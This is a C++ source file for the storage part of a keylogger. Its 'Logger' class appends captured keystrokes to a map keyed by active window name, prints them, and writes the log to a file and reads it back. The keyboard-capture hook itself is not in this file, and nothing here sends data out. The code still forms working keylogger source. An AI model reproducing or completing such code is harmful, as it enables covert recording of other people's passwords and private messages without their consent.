#include "pch.h"
#include "Logger.h"

// Logger(string) : Constructor of the Logger class
Logger::Logger(string path)
{
	this->SetPath(path);
}

// Logger(string, bool) : Constructor of the Logger class
Logger::Logger(string path, bool load)
{
	this->SetPath(path);

	if (load)
		this->LoadMapFromFile();
}

// Insert(string, string) : Insert into map the key stroke on the window
void Logger::Insert(string window_name, string key_input)
{
	this->Log[window_name] += key_input;
	cout << window_name << " : " << this->Log[window_name] << endl; // DEBUG
}

// Insert(string, int) : Insert into map the key stroke on the window
void Logger::Insert(string window_name, int key_input)
{
	this->Log[window_name] += key_input;
	cout << window_name << " : " << this->Log[window_name] << endl; // DEBUG
}


// Add(string, int) : Add key stroke and the window name to Logger
void Logger::Add(string window_name, int key_stroke)
{
	// Check if key stroke is mapped if not map_key == "" 
	string map_key = Keys.Map[key_stroke];

	// If key is not mapped
	if (map_key == "")
	{
		if(key_stroke == 190 || key_stroke == 110)
		{
			this->Insert(window_name, "."); // Not working
		}
		else
		{
			this->Insert(window_name, key_stroke);
		}
	}
	else
	{		
		this->Insert(window_name, map_key);
	}
}

// GetLog(string) : Return the key log for a specific window
string Logger::GetLog(string window_name) 
{
	return this->Log.find(window_name)->second;
}

// GetLog(string) : Return all the key log for all window
string Logger::GetLog()
{
	string log = "";

	// Go through all the log
	for (map<string, string>::iterator iter = Log.begin(); iter != Log.end(); ++iter)
	{
		log += iter->first + " > " + iter->second;
	}

	return log;
}

// GetPath() : Return the path to the log file
string Logger::GetPath() const
{
	return this->Path;
}

// SetPath(string) :  Set the path of the log file
void Logger::SetPath(string path)
{
	this->Path = path;
}

// SaveMapToFile() : Save Map content to file
void Logger::SaveMapToFile()
{
	// Initiate file stream and map iterator
	ofstream file(this->Path);
	map<string, string>::iterator iter;

	// Go through all map log and write it to file
	for (iter = Log.begin(); iter != Log.end(); ++iter)
	{
		file << iter->first << endl;
		file << iter->second << endl;
	}

	// Close file
	file.close();
}

// LoadMapFromFile() : Load file content to map
bool Logger::LoadMapFromFile()
{
	ifstream file(this->Path);

	// Make sure file exist
	if (!file)
		return false; // Unable to open file
	else
	{
		string window_line;
		string log_line;

		// Getline while not at end of file
		while (getline(file, window_line)) // Even line = window name
		{
			getline(file, log_line); // Odd line = log entre of previous even line (window name)
			this->Log[window_line] = log_line; // Add file entrees to map log
		}

		return true;
	}
}